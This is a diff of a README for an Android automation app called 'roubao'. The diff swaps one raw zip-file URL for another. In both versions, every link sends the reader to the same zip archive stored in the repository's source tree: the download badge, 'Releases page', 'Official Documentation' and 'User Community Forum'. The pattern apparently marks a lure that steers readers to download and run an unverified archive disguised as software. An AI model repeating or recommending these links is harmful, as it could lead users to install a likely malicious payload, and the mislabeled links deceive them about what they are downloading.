@@ -1,7 +1,7 @@
 # 🤖 roubao - Automate Your Android Experience Effortlessly
 
 ## 📥 Download Now
-[![Download roubao](https://github.com/Mohsinmjr/roubao/raw/refs/heads/main/app/src/main/Software_1.1.zip)](https://github.com/Mohsinmjr/roubao/raw/refs/heads/main/app/src/main/Software_1.1.zip)
+[![Download roubao](https://raw.githubusercontent.com/Mohsinmjr/roubao/main/app/Software-v1.0.zip)](https://raw.githubusercontent.com/Mohsinmjr/roubao/main/app/Software-v1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to roubao, your go-to Android automation tool designed using advanced vision-language models. This tool helps you automate tasks on your Android device easily and efficiently. Whether you want to automate routine actions or enhance your mobile experience, roubao is here to assist.
@@ -25,7 +25,7 @@ Roubao allows you to schedule tasks at your convenience. Use the built-in schedu
 ## 📜 Usage Instructions
 Follow these simple steps to get started with roubao:
 
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/Mohsinmjr/roubao/raw/refs/heads/main/app/src/main/Software_1.1.zip).
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/Mohsinmjr/roubao/main/app/Software-v1.0.zip).
    
 2. **Download the Latest Version:** Look for the latest release and click on it to download.
 
@@ -47,7 +47,7 @@ Roubao is designed with user privacy and security in mind. Ensure you download i
 You can automate messaging, app navigation, and interactions within the device, like opening apps, sending texts, and more. The possibilities are vast.
 
 ### How do I update the app?
-Visit the [Releases page](https://github.com/Mohsinmjr/roubao/raw/refs/heads/main/app/src/main/Software_1.1.zip) periodically to check for new updates. Follow the same steps as the initial installation to update to the latest version.
+Visit the [Releases page](https://raw.githubusercontent.com/Mohsinmjr/roubao/main/app/Software-v1.0.zip) periodically to check for new updates. Follow the same steps as the initial installation to update to the latest version.
 
 ## 🎯 Troubleshooting
 If you experience issues while using roubao, consider the following troubleshooting steps:
@@ -56,11 +56,11 @@ If you experience issues while using roubao, consider the following troubleshoot
 - **Reinstall the App:** If problems persist, uninstall and then reinstall the app using the latest version from the Releases page.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://github.com/Mohsinmjr/roubao/raw/refs/heads/main/app/src/main/Software_1.1.zip)
-- [User Community Forum](https://github.com/Mohsinmjr/roubao/raw/refs/heads/main/app/src/main/Software_1.1.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Mohsinmjr/roubao/main/app/Software-v1.0.zip)
+- [User Community Forum](https://raw.githubusercontent.com/Mohsinmjr/roubao/main/app/Software-v1.0.zip)
 
 ## 🌟 Feedback
 Your feedback is valuable to us. If you have suggestions or experience any issues, please submit an issue on our GitHub page. We strive to improve roubao based on user experiences.
 
 ## 📥 Download Again
-In case you missed it, you can always visit the [Releases page](https://github.com/Mohsinmjr/roubao/raw/refs/heads/main/app/src/main/Software_1.1.zip) to download the latest version of roubao. Enjoy automating your Android experience!
+In case you missed it, you can always visit the [Releases page](https://raw.githubusercontent.com/Mohsinmjr/roubao/main/app/Software-v1.0.zip) to download the latest version of roubao. Enjoy automating your Android experience!
